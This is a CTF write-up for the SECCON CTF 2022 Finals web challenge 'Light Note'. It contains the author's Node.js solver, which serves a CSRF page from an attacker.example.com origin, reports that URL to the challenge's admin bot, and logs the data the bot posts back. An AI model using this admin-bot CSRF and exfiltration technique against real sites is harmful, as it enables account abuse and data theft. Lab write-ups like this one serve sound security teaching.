---
title: "Light Note - SECCON CTF 2022 Finals 2023"
category: "web"
subcategory: "csrf"
type: "writeup"
tags: ["arkark-my-ctf-challenges", "author-solution", "challenge-source", "csrf", "light", "note", "web", "seccon-ctf-2022-finals"]
summary: "I created a blazing fast note application!"
source:
  name: "arkark/my-ctf-challenges"
  url: "https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/light-note"
license: "none stated"
ctf:
  name: "SECCON CTF 2022 Finals"
  year: 2023
  challenge: "Light Note"
---

## Challenge

- **Author:** [arkark](https://github.com/arkark)
- **Source:** <https://github.com/arkark/my-ctf-challenges/tree/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/light-note>
- **CTF:** SECCON CTF 2022 Finals 2023

---

# [web] light-note

## Description

I created a blazing fast note application!

- `https://light-note.{int,dom}.seccon.games`

## Attachments

- [light-note](files/light-note)

## Usage

Launch a challenge server:

```
cd files/light-note
docker compose up
```

Run the author's solver:

```
docker run -it \
    -e SECCON_BASE_URL=http://localhost:3000 \
    -e ATTACK_BASE_URL=http://attacker.example.com \
    -p 8080:8080 --network=host \
    (docker build -q ./solver)
```

where `http://attacker.example.com` is an origin forwarded to `http://localhost:8080`.


## Solver: `index.js`

<https://github.com/arkark/my-ctf-challenges/blob/325bbde6aaf1b2b2d07f3ddedf734094af81ec94/challenges/202302_SECCON_CTF_2022_Finals/web/light-note/solver/index.js>

```javascript
const fastify = require("fastify")();
const fs = require("node:fs").promises;

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const SECCON_BASE_URL =
  process.env.SECCON_BASE_URL ?? fail("No SECCON_BASE_URL");
const ATTACK_BASE_URL =
  process.env.ATTACK_BASE_URL ?? fail("No ATTACK_BASE_URL");
const LISTEN_PORT = "8080";

if (!ATTACK_BASE_URL.startsWith("http://")) {
  fail("Invalid ATTACK_BASE_URL: the CSRF will fail");
}

const sleep = (msec) => new Promise((resolve) => setTimeout(resolve, msec));

const reportUrl = async (url) => {
  const res = await fetch(`${SECCON_BASE_URL}/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      url,
    }),
  }).then((r) => r.text());
  console.log(res); // "Received :)"
};

const start = async () => {
  fastify.get("/", async (req, reply) => {
    const html = await fs.readFile("index.html");
    return reply.type("text/html; charset=utf-8").send(html);
  });

  fastify.post("/", async (req, reply) => {
    console.log(req.body);
    process.exit(0);
  });

  fastify.listen(
    { port: LISTEN_PORT, host: "0.0.0.0" },
    async (err, address) => {
      if (err) fail(err.toString());

      await sleep(3 * 1000);
      await reportUrl(
        `${ATTACK_BASE_URL}?${new URLSearchParams({
          baseUrl: "http://localhost:3000",
        })}`
      );

      await sleep(20 * 1000);
      fail("Failed");
    }
  );
};
start();
```
